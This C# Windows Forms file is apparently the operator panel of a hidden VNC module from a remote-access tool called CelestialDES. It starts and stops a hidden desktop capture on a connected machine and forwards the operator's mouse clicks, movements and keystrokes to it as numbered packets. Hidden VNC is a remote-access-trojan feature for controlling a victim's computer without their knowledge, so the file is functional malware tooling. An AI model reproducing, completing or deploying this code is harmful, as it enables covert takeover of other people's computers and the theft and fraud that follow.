using CelestialDES.Helper;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CelestialDES.winforms
{
    public partial class HiddenVNC : Form
    {
        public int ConnectionID { get; set; }
        public static bool hVNCActive { get; set; }
        public CustomPictureBox customPictureBox1;
        public HiddenVNC()
        {
            InitializeComponent();
        }
        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox2.Text.Trim().Length < 2)
                textBox2.Text = "10";
            if (hVNCActive)
            {
                textBox1.Enabled = true;
                textBox2.Enabled = true;
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)63);
                PacketSender.Send(ConnectionID, ToSend.ToArray());
                hVNCActive = false;
                button1.Text = "Start capture";
            }
            else
            {
                textBox1.Enabled = false;
                textBox2.Enabled = false;
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)62);
                ToSend.AddRange(Encoding.UTF8.GetBytes(textBox1.Text));
                ToSend.Add((byte)';');
                ToSend.AddRange(Encoding.UTF8.GetBytes(textBox2.Text));
                PacketSender.Send(ConnectionID, ToSend.ToArray());
                hVNCActive = true;
                button1.Text = "Stop capture";
            }
        }

        /* protected override bool ProcessCmdKey(ref System.Windows.Forms.Message msg, System.Windows.Forms.Keys keyData)
         {
             customPictureBox1.TriggerWndProc(ref msg);
             return true;
             //return base.ProcessCmdKey(ref msg, keyData);
         }*/


        private void textBox2_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = !char.IsDigit(e.KeyChar) && !char.IsControl(e.KeyChar);
        }

        private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = !char.IsDigit(e.KeyChar) && !char.IsControl(e.KeyChar);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)64);
            ToSend.AddRange(Encoding.UTF8.GetBytes(comboBox1.SelectedIndex.ToString()));
            PacketSender.Send(ConnectionID, ToSend.ToArray());
        }

        private void pbDesktop_Click(object sender, EventArgs e)
        {

        }
        //hVNCActive && 
        //customPictureBox1.TriggerWndProc(ref m);
        public class CustomPictureBox : PictureBox
        {
            int client;
            public CustomPictureBox(int _client)
            {
                client = _client;
            }

            // Constants for clipboard data formats
            public const uint CF_TEXT = 1;          // Text format
            public const uint CF_BITMAP = 2;        // Bitmap format
            public const uint CF_UNICODETEXT = 13;   // Unicode text format
            public const uint CF_HDROP = 15;         // File format

            // Import the necessary WinAPI functions
            [DllImport("user32.dll")]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool IsClipboardFormatAvailable(uint format);

            [DllImport("user32.dll")]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool OpenClipboard(IntPtr hWndNewOwner);

            [DllImport("user32.dll")]
            public static extern IntPtr GetClipboardData(uint uFormat);


            [DllImport("user32.dll")]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool CloseClipboard();

            public Point TranslateCoordinates(Point originalCoords, Size originalScreenSize, PictureBox targetControl)
            {
                // Calculate the scaling factors
                float scaleX = (float)targetControl.Image.Width / originalScreenSize.Width;
                float scaleY = (float)targetControl.Image.Height / originalScreenSize.Height;

                // Apply the scaling factors
                int scaledX = (int)(originalCoords.X * scaleX);
                int scaledY = (int)(originalCoords.Y * scaleY);

                // Get the unzoomed and offset-adjusted coordinates
                Point translatedCoords = UnzoomedAndAdjusted(targetControl, new Point(scaledX, scaledY));

                return translatedCoords;
            }
            public static void GetClipboardFormat()
            {
                if (!OpenClipboard(IntPtr.Zero))
                    return;


                if (IsClipboardFormatAvailable(CF_TEXT))
                {
                    IntPtr hGlobal = GetClipboardData(CF_TEXT);
                    string clipboardText = Marshal.PtrToStringUni(hGlobal);
                    Marshal.FreeHGlobal(hGlobal);
                }
                else if (IsClipboardFormatAvailable(CF_BITMAP))
                {
                    IntPtr hBitmap = GetClipboardData(CF_BITMAP);
                    System.Drawing.Bitmap clipboardBitmap = System.Drawing.Bitmap.FromHbitmap(hBitmap);
                    Marshal.FreeHGlobal(hBitmap);
                }
                else if (IsClipboardFormatAvailable(CF_UNICODETEXT))
                {
                    IntPtr hGlobal = GetClipboardData(CF_UNICODETEXT);
                    string clipboardText = Marshal.PtrToStringUni(hGlobal);
                    Marshal.FreeHGlobal(hGlobal);
                }

                CloseClipboard();
            }
            private Point UnzoomedAndAdjusted(PictureBox pictureBox, Point scaledPoint)
            {
                // Calculate the zoom factor
                float zoomFactor = Math.Min(
                    (float)pictureBox.ClientSize.Width / pictureBox.Image.Width,
                    (float)pictureBox.ClientSize.Height / pictureBox.Image.Height);

                // Get the displayed rectangle of the image
                Rectangle displayedRect = GetImageDisplayRectangle(pictureBox);

                // Offset and unzoom the coordinates
                int translatedX = (int)((scaledPoint.X - displayedRect.X) / zoomFactor);
                int translatedY = (int)((scaledPoint.Y - displayedRect.Y) / zoomFactor);

                return new Point(translatedX, translatedY);
            }

            private Rectangle GetImageDisplayRectangle(PictureBox pictureBox)
            {
                if (pictureBox.SizeMode == PictureBoxSizeMode.Normal)
                {
                    return new Rectangle(0, 0, pictureBox.Image.Width, pictureBox.Image.Height);
                }
                else if (pictureBox.SizeMode == PictureBoxSizeMode.StretchImage)
                {
                    return pictureBox.ClientRectangle;
                }
                else
                {
                    float zoomFactor = Math.Min(
                        (float)pictureBox.ClientSize.Width / pictureBox.Image.Width,
                        (float)pictureBox.ClientSize.Height / pictureBox.Image.Height);

                    int imageWidth = (int)(pictureBox.Image.Width * zoomFactor);
                    int imageHeight = (int)(pictureBox.Image.Height * zoomFactor);

                    int imageX = (pictureBox.ClientSize.Width - imageWidth) / 2;
                    int imageY = (pictureBox.ClientSize.Height - imageHeight) / 2;

                    return new Rectangle(imageX, imageY, imageWidth, imageHeight);
                }
            }
            public void TriggerWndProc(ref Message m)
            {
                WndProc(ref m);
            }

            protected override void WndProc(ref Message m)
            {
                try
                {
                    if (this.Image == null || hVNCActive == false)
                    {
                        base.WndProc(ref m);
                        return;
                    }
                    switch (m.Msg)
                    {
                        case 0x302:
                            break;

                        case 0x0201: // WM_LBUTTONDOWN
                        case 0x0202: // WM_LBUTTONUP
                        case 0x0204: // WM_RBUTTONDOWN
                        case 0x0205: // WM_RBUTTONUP
                        case 0x0207: // WM_MBUTTONDOWN
                        case 0x0208: // WM_MBUTTONUP
                        case 0x0203: // WM_LBUTTONDBLCLK
                        case 0x0206: // WM_RBUTTONDBLCLK
                        case 0x0209: // WM_MBUTTONDBLCLK
                        case 0x0200: // WM_MOUSEMOVE
                        case 0x020A: // WM_MOUSEWHEEL
                            int x = (int)(m.LParam.ToInt32() & 0xFFFF);
                            int y = (int)((m.LParam.ToInt32() >> 16) & 0xFFFF);
                            Point newpoint = TranslateCoordinates(new Point(x, y), this.Image.Size, this);
                            x = newpoint.X;
                            y = newpoint.Y;

                            m.LParam = (IntPtr)((y << 16) | (x & 0xFFFF));

                            uint msg = (uint)m.Msg;
                            IntPtr wParam = m.WParam;
                            IntPtr lParam = m.LParam;
                            int Imsg = (int)msg;
                            int IwParam = (int)wParam;
                            int IlParam = (int)lParam;
                            Task.Run(() => {
                                List<byte> ToSend = new List<byte>();
                                ToSend.Add((int)65);
                                ToSend.AddRange(Encoding.UTF8.GetBytes(Imsg.ToString()));
                                ToSend.Add((byte)'|');
                                ToSend.AddRange(Encoding.UTF8.GetBytes(IwParam.ToString()));
                                ToSend.Add((byte)'|');
                                ToSend.AddRange(Encoding.UTF8.GetBytes(IlParam.ToString()));
                                PacketSender.Send(client, ToSend.ToArray());
                                return Task.CompletedTask;
                            }).Wait();
                            break;
                    }
                }
                catch { }
                base.WndProc(ref m);
            }

        }
        private void HiddenVNC_Load(object sender, EventArgs e)
        {
            customPictureBox1 = new CustomPictureBox(ConnectionID);
            customPictureBox1.Dock = pbDesktop.Dock;
            customPictureBox1.Name = "pbDesktop";
            customPictureBox1.Size = pbDesktop.Size;
            customPictureBox1.Location = pbDesktop.Location;
            customPictureBox1.Image = pbDesktop.Image;
            customPictureBox1.SizeMode = pbDesktop.SizeMode;
            customPictureBox1.Anchor = pbDesktop.Anchor;
            Controls.Remove(pbDesktop);
            Controls.Add(customPictureBox1);
        }

        private void HiddenVNC_FormClosing(object sender, FormClosingEventArgs e)
        {
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)63);
            PacketSender.Send(ConnectionID, ToSend.ToArray());
            hVNCActive = false;
        }

        private void HiddenVNC_KeyDown(object sender, KeyEventArgs e)
        {
            uint msg = 0x0100;
            IntPtr wParam = (IntPtr)e.KeyValue;

            int Imsg = (int)msg;
            int IwParam = (int)wParam;
            int IlParam = (int)IntPtr.Zero;

            Task.Run(() => {
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)65);
                ToSend.AddRange(Encoding.UTF8.GetBytes(Imsg.ToString()));
                ToSend.Add((byte)'|');
                ToSend.AddRange(Encoding.UTF8.GetBytes(IwParam.ToString()));
                ToSend.Add((byte)'|');
                ToSend.AddRange(Encoding.UTF8.GetBytes(IlParam.ToString()));
                PacketSender.Send(ConnectionID, ToSend.ToArray());
                return Task.CompletedTask;
            }).Wait();
        }
    }
}
